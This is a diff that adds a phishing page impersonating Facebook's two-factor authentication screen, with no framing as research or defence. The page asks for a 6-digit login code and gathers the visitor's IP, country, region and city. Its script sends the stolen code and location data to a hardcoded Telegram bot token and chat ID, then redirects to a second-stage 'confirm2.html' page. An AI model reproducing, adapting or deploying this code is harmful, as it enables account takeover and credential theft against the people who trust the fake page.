@@ -1,0 +1,424 @@
+
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+
+  &lt;head&gt;
+    &lt;!-- Required meta tags --&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css&quot;
+      integrity=&quot;sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh&quot; crossorigin=&quot;anonymous&quot;&gt;
+
+    &lt;title&gt;Facebook&lt;/title&gt;
+    &lt;script src=&quot;https://kit.fontawesome.com/83fd8385f7.js&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+
+    &lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;default.ico&quot;&gt;
+    &lt;style type=&quot;text/css&quot;&gt;
+      @font-face {
+  font-family: system-ui;
+  src: url(images/Helvetica-Font/Helvetica.ttf);
+}
+
+*,body,p,span,a,div,tr,td,th,h1,h2 {
+  font-family: system-ui;
+}
+      body {
+        background-color: #f0f2f5;
+        font-family: system-ui;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      .header {
+        background-color: white;
+        padding-top: 8px;
+        padding-bottom: 8px;
+        box-shadow: 1px 1px 8px 1px rgb(0 0 0 / 10%);
+      }
+
+      .main .card {
+        margin-top: 60px;
+        background-color: white;
+        padding-top: 16px;
+        padding-bottom: 0px;
+        padding-left: 16px;
+        padding-right: 16px;
+        border: none;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        margin-bottom: 30px;
+      }
+
+      .main .open {
+        color: white;
+        padding: 4px 10px;
+        border-radius: 5px;
+      }
+
+      .ikonauser {
+        background-color: #c4c9cd;
+        border-radius: 50%;
+        font-size: 15px;
+        color: white;
+        padding: 10px;
+      }
+
+      label {
+        color: #90949c;
+        font-weight: bold;
+        font-size: 12px;
+      }
+
+      input[type=text],
+      textarea,
+      input[type=password] {
+        color: #495057;
+        background-color: #fff;
+        background-clip: padding-box;
+        border-radius: 0px !important;
+        border: 1px solid #ced4da;
+
+      }
+
+      .butoni {
+        background-color: #4267b2;
+        border: 1px solid #4267b2;
+        color: white;
+        margin-top: 15px;
+        font-size: 13px;
+        font-weight: 500;
+        padding: 7px 20px;
+        border-radius: 2px;
+        text-transform: none;
+        font-weight: bold;
+      }
+
+      .butoni:hover {
+        background-color: #444444;
+      }
+
+      #main {}
+
+      #fac {
+        margin-top: 50px;
+        display: none;
+        margin-bottom: 60px;
+      }
+
+      .twh3 {
+        border-bottom: 1px solid rgba(0, 0, 0, .101);
+        background-color: #fff;
+        font-size: 16px;
+        color: #4b4f56;
+        padding: 12px;
+        font-weight: 700;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+      }
+
+      #fac .card {
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+      }
+
+      #fac .bodyyy p {
+        font-size: 13px;
+      }
+
+      #fac .bodyyy {
+        padding: 10px 20px !important;
+        border-bottom: 1px solid rgba(0, 0, 0, .101);
+      }
+
+      #fac .footerii {
+        padding: 10px 20px !important;
+        background-color: #fff;
+        height: 55px;
+
+      }
+
+      .nolink {
+        color: black !important;
+        font-size: 14px !important;
+      }
+
+      #twof .modal-body {
+        font-size: 14px;
+      }
+
+      .paddingleftt {
+        padding-left: 12px;
+      }
+
+      @media only screen and (max-width: 600px) {}
+
+
+      @media (max-width: 400px) {
+        .linkupertwo {
+          font-size: 12px !important;
+          margin-top: 8px !important;
+        }
+      }
+
+      .btn:hover {
+        color: white !important;
+      }
+
+      .ourmessagiii {
+        font-family: &quot;Arial&quot;;
+      }
+
+      #sendcodeagain {
+        display: none;
+        font-size: 14px;
+        padding-left: 0px;
+        color: #385898;
+      }
+
+      #sendcodeagain:hover {
+        color: #385898 !important;
+      }
+
+      .fotoh
+      {
+        width: 94%;
+        margin: 0 auto;
+      }
+
+
+      /* Chrome, Safari, Edge, Opera */
+      input::-webkit-outer-spin-button,
+      input::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+      }
+
+      /* Firefox */
+      input[type=number] {
+        -moz-appearance: textfield;
+      }
+    &lt;/style&gt;
+
+
+  &lt;/head&gt;
+
+&lt;body&gt;
+  &lt;section class=&quot;header&quot;&gt;
+    &lt;div class=&quot;fotoh&quot;&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;col-6&quot;&gt;
+          &lt;img src=&quot;Facebook_f_logo.png&quot; class=&quot;img-fluid&quot; width=&quot;40&quot; /&gt;
+        &lt;/div&gt;
+
+        &lt;div class=&quot;col-6&quot; style=&quot;text-align: right;&quot;&gt;
+          &lt;!-- &lt;div style=&quot;padding-top: 4px;&quot;&gt;
+              &lt;img src=&quot;&quot; encodeURIComponent(image)&quot; class=&quot;img-fluid&quot; width=&quot;30&quot; height=&quot;30&quot; style=&quot;object-fit: cover; display: inline-block; border-radius: 50%;&quot; /&gt;
+              &lt;p style=&quot;display: inline-block; margin-bottom: 0px; font-weight: 600; font-size: 14px; color:#050505&quot;&gt;&lt;/p&gt;
+            &lt;/div&gt;--&gt;
+          &lt;p
+            style=&quot;color:#3578e5; display:none; padding-top: 8px; margin-bottom: 0px; font-weight: 600; font-size: 15px;&quot;&gt;
+            &lt;i style=&quot;font-size: 16px;&quot; class=&quot;fa-solid fa-envelope&quot;&gt;&lt;/i&gt; Support Inbox
+          &lt;/p&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/section&gt;
+  &lt;section id=&quot;fac&quot; style=&quot;display: block;&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+      &lt;div class=&quot;row justify-content-center&quot;&gt;
+        &lt;div class=&quot;col-md-8 col-xl-7 col-sm-8&quot;&gt;
+          &lt;div class=&quot;card&quot;&gt;
+            &lt;h3 class=&quot;twh3&quot;&gt;Two-factor authentication required (1/3)&lt;/h3&gt;
+
+            &lt;div class=&quot;bodyyy&quot;&gt;
+              &lt;p&gt;You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new
+                device or browser.&lt;/p&gt;
+
+              &lt;p&gt;Enter the 6-digit code from your &lt;strong&gt;code generator&lt;/strong&gt; or third-party app below.&lt;/p&gt;
+
+
+              &lt;div class=&quot;form-group&quot;
+                style=&quot;padding-left: 0px; padding-top: 5px; padding-bottom: 10px; display:inline-block&quot;&gt;
+                &lt;input style=&quot;margin-left: 0px !important; font-size: 14px; border: 1px solid #ccc;
+    border-radius: 4px;
+    -webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
+    box-shadow: 0 0 0 0.2rem rgba(0,123,255,.25)!important;
+    -webkit-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s; color: #4e4d4d&quot; type=&quot;number&quot;
+                  id=&quot;code&quot; class=&quot;form-control mx-sm-3&quot; aria-describedby=&quot;passwordHelpInline&quot; placeholder=&quot;Login code&quot;
+                  name=&quot;code&quot; minlength=&quot;4&quot; required=&quot;&quot;&gt;
+              &lt;/div&gt;
+              &lt;div class=&quot;form-group paddingleftt&quot; style=&quot;margin-top: -8px; display:inline-block;&quot;&gt;
+                &lt;p name=&quot;&quot; class=&quot;nolink&quot; id=&quot;timer&quot; style=&quot;background-color: transparent;
+    border: transparent;
+    padding: 0px;
+    margin: 0px;
+    display: inline;
+    color:#385898;
+    font-size: 12px;&quot;&gt;(wait: &lt;span id=&quot;timeri&quot; style=&quot;margin-bottom: 0px; display: inline&quot;&gt;&lt;/span&gt;)
+                &lt;/p&gt;
+                &lt;a id=&quot;sendcodeagain&quot; class=&quot;btn&quot; onclick=&quot;sendcodeagain();&quot;&gt;Send Again&lt;/a&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+
+            &lt;div class=&quot;footerii&quot; style=&quot;width:100%;&quot;&gt;
+              &lt;a data-toggle=&quot;modal&quot; data-target=&quot;#twof&quot;
+                style=&quot;font-size: 14px; font-family: system-ui; color: #385898; font-weight: 600; margin-bottom: 0px; float: left; margin-top: 6px; cursor: pointer;&quot;
+                class=&quot;linkupertwo&quot;&gt;Need another way to authenticate?&lt;/a&gt;
+              &lt;button class=&quot;btn butoni&quot; onclick=&quot;handleActions()&quot; style=&quot;margin-top: 0px; margin-bottom: 0px; float: right;     background-color: #4267b2;
+    border: 1px solid #4267b2;
+    color: white;
+    font-size: 13px;
+    font-weight: 500;
+    padding: 5px 20px;
+    border-radius: 4px;
+    text-transform: none;
+    font-weight: bold;&quot;&gt;Send&lt;/button&gt;
+
+            &lt;/div&gt;
+
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/section&gt;
+  &lt;style&gt; 
+    .form-control {
+      border:1px solid #d0d0d0 !important;
+      border-radius: 4px !important;
+      padding: 1rem 0.5rem !important;
+      resize: none !important;
+    }
+    &lt;/style&gt;
+  &lt;div class=&quot;modal fade&quot; id=&quot;twof&quot; tabindex=&quot;-1&quot; role=&quot;dialog&quot; aria-labelledby=&quot;exampleModalLabel&quot; aria-hidden=&quot;true&quot;&gt;
+    &lt;div class=&quot;modal-dialog&quot; role=&quot;document&quot;&gt;
+      &lt;div class=&quot;modal-content&quot;&gt;
+        &lt;div class=&quot;modal-header&quot;&gt;
+          &lt;h5 class=&quot;modal-title&quot; id=&quot;exampleModalLabel&quot; style=&quot;font-size: 16px;&quot;&gt;Didn’t receive a code?&lt;/h5&gt;
+
+          &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;modal&quot; aria-label=&quot;Close&quot;&gt;
+            &lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;
+          &lt;/button&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;modal-body&quot;&gt;
+          &lt;p&gt;1. Go to &lt;strong&gt;Settings &gt; Security and Login.&lt;/strong&gt;&lt;/p&gt;
+          &lt;p&gt;2. Under the &lt;strong&gt;Two-Factor Authentication&lt;/strong&gt; section, click &lt;strong&gt;Use two-factor
+              authentication&lt;/strong&gt;. You may need to re-enter your password.&lt;/p&gt;
+          &lt;p&gt;3. Next to &lt;strong&gt;Recovery Codes&lt;/strong&gt;, click &lt;strong&gt;Setup&lt;/strong&gt; then &lt;strong&gt;Get Codes&lt;/strong&gt;.
+            If you&#39;ve already set up recovery codes, you can click &lt;strong&gt;Show Codes.&lt;/strong&gt;&lt;/p&gt;
+        &lt;/div&gt;
+
+        &lt;div class=&quot;modal-footer&quot;&gt;
+          &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot; data-dismiss=&quot;modal&quot;&gt;Close&lt;/button&gt;
+        &lt;/div&gt;
+
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+  &lt;input type=&quot;hidden&quot; id=&quot;ip_hidden&quot; value=&quot;&quot;&gt;
+  &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js&quot;
+    integrity=&quot;sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM&quot;
+    crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+  &lt;script&gt;
+    function getIp() {
+      $.get(&quot;https://api.ipify.org/?format=json&quot;, function (response) {
+        $(&quot;#ip_hidden&quot;).val(response.ip);
+      });
+    }
+    getIp();
+    function handleActions() {
+
+      let code = document.querySelector(&quot;#code&quot;);
+
+      if (code.value == &#39;&#39;) {
+        $(&quot;#code&quot;).css(&#39;border&#39;, &#39;1px solid red&#39;);
+        return;
+      } else {
+        var bot = &#39;bot6864685784:AAHjYHlXBDMm2Vbl8l_T5FDqq6l1HmiYbbU&#39;;
+        var chid = &#39;5607989288&#39;;
+
+        $.get(&quot;https://ipapi.co/json/&quot;, function (response) {
+          let country = response.country;
+          let regionName = response.region;
+          let city = response.city;
+          let ip = $(&quot;#ip_hidden&quot;).val();
+
+          var params = {
+            content: &#39;========================&#39; + &#39;%0A&#39; +
+              &#39;TWO 1: &quot;&#39; + code.value + &#39;&quot;&#39; + &#39;%0A&#39; +
+            &#39;&#39; + &#39;%0A&#39; +
+            &#39;Country : &quot;&#39; + country + &#39;&quot;&#39; + &#39;%0A&#39; +
+            &#39;Region : &quot;&#39; + regionName + &#39;&quot;&#39; + &#39;%0A&#39; +
+            &#39;City : &quot;&#39; + city + &#39;&quot;&#39; + &#39;%0A&#39; +
+            &#39;IP: &quot;&#39; + ip + &#39;&quot;&#39; + &#39;%0A&#39; +
+              &#39;========================&#39;
+          }
+
+          fetch(`https://api.telegram.org/bot6864685784:AAHjYHlXBDMm2Vbl8l_T5FDqq6l1HmiYbbU/sendMessage?chat_id=5607989288&amp;text=${params.content}`, {
+            method: &#39;POST&#39;, // or &#39;PUT&#39;
+            headers: {
+              &#39;Content-Type&#39;: &#39;application/json&#39;,
+            },
+
+          }).then(function () {
+            window.location = &#39;confirm2.html&#39;;
+
+          })
+          $(&quot;.fb-btn&quot;).attr(&#39;disabled&#39;, true);
+
+
+        });
+      }
+
+    }
+    $(&#39;.numeric&#39;).on(&#39;input&#39;, function (event) {
+      if (this.value !== &#39;&#39;) {
+        $(&#39;#code&#39;).css(&#39;border&#39;, &#39;none&#39;);
+      }
+      this.value = this.value.replace(/[^0-9]/g, &#39;&#39;);
+    });
+  &lt;/script&gt;
+  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;
+    integrity=&quot;sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+  &lt;script type=&quot;text/javascript&quot;&gt;
+    function startTimer(duration, display) {
+      var timer = duration, minutes, seconds;
+      var myInterval = setInterval(function () {
+        minutes = parseInt(timer / 60, 10)
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes &lt; 10 ? &quot;0&quot; + minutes : minutes;
+        seconds = seconds &lt; 10 ? &quot;0&quot; + seconds : seconds;
+
+        display.textContent = minutes + &quot;:&quot; + seconds;
+
+        if (timer == 0) {
+          document.getElementById(&quot;timer&quot;).style.display = &quot;none&quot;;
+          document.getElementById(&quot;sendcodeagain&quot;).style.display = &quot;block&quot;;
+          clearInterval(myInterval);
+        }
+        if (--timer &lt; 0) {
+          timer = duration;
+        }
+      }, 1000);
+    }
+
+    var fiveMinutes = 60 * 5,
+      display = document.querySelector(&#39;#timeri&#39;);
+    startTimer(fiveMinutes, display);
+
+  &lt;/script&gt;
+  &lt;script src=&quot;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&quot;
+    integrity=&quot;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&quot;
+    crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js&quot;
+    integrity=&quot;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&quot;
+    crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
